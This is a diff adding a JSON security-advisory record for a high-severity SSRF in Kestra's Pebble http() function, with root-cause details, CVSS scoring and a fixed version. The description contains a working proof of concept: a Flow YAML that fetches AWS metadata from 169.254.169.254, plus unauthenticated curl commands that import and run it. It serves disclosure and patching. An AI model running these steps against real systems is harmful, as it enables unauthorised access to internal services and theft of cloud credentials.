@@ -1,0 +1,53 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-09-17T17:15:51Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.kestra:kestra-core"
+  },
+  "Advisory": {
+    "DatabaseId": 496529,
+    "Id": "GSA_kwCzR0hTQS1yNTZnLXE0cDYtbTNwNs4AB5OR",
+    "GhsaId": "GHSA-r56g-q4p6-m3p6",
+    "References": [
+      {
+        "Url": "https://github.com/kestra-io/kestra/security/advisories/GHSA-r56g-q4p6-m3p6"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73247"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-r56g-q4p6-m3p6"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-r56g-q4p6-m3p6"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-73247"
+      }
+    ],
+    "Description": "### Summary\nThe Pebble template engine's `http()` function in Kestra OSS accepts user-controlled URLs without any validation, allowing Server-Side Request Forgery (SSRF) attacks. An unauthenticated attacker can import a malicious Flow YAML and execute it to access internal services, cloud metadata endpoints (AWS 169.254.169.254), or localhost services. The vulnerability affects all Kestra OSS deployments with default configuration.\n\n### Details\nThe root cause is in `core/src/main/java/io/kestra/core/runners/pebble/functions/HttpFunction.java` (lines 77-106):\n\n1. **No URL validation**: User input is passed directly to `URI.create()` with no checks for private IPs, internal hosts, or restricted schemes\n2. **No IP filtering**: Missing checks for 10.0.0.0/8, 192.168.0.0/16, 169.254.169.254, 127.0.0.1\n3. **No scheme restriction**: `file://`, `gopher://` schemes are not blocked\n4. **No authentication required**: `TenantValidationFilter.java` only checks tenant == \"main\" — no authentication\n5. **Unconditional registration**: `HttpFunction` is registered without any feature flags in `Extension.java:180`\n\n### PoC\n**Prerequisites:**\n```bash\ndocker run -d --name kestra-ssrf -p 8080:8080 kestra/kestra:latest server local\nsleep 30\n```\n\n**Step 1: Create malicious Flow YAML**\n```yaml\ncat \u003e /tmp/ssrf_poc.yaml \u003c\u003c 'YAML'\nid: ssrf_metadata\nnamespace: company.team\ntasks:\n  - id: exfiltrate\n    type: io.kestra.plugin.core.log.Log\n    message: |\n      {{ http(uri='http://169.254.169.254/latest/meta-data/', method='GET') }}\nYAML\n```\n\n**Step 2: Import without authentication**\n```bash\ncurl -X POST http://localhost:8080/api/v1/main/flows/import \\\n  -F \"fileUpload=@/tmp/ssrf_poc.yaml\"\n```\n\n**Step 3: Execute the flow**\n```bash\ncurl -X POST http://localhost:8080/api/v1/main/executions/company.team/ssrf_metadata\n```\n\n**Step 4: Verify** — the flow execution output contains AWS EC2 metadata (ami-id, instance-type, IAM credentials if available)\n\n### Impact\n- **CVSS 3.1**: 8.6 (HIGH) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\n- **CWE**: CWE-918 (Server-Side Request Forgery)\n- **Affected**: All Kestra OSS versions (default deployment)\n- **Impact**: Attackers can access internal services, cloud metadata (AWS/GCP/Azure), localhost endpoints, and potentially escalate to cloud credential theft",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-09-17T17:15:50Z",
+    "Severity": "HIGH",
+    "Summary": "Kestra: SSRF via Pebble http() function allows unauthenticated access to internal services \u0026 cloud metadata",
+    "UpdatedAt": "2026-09-17T17:15:52Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.6,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.0.0"
+      },
+      "VulnerableVersionRange": "\u003c 2.0.0"
+    }
+  ]
+}
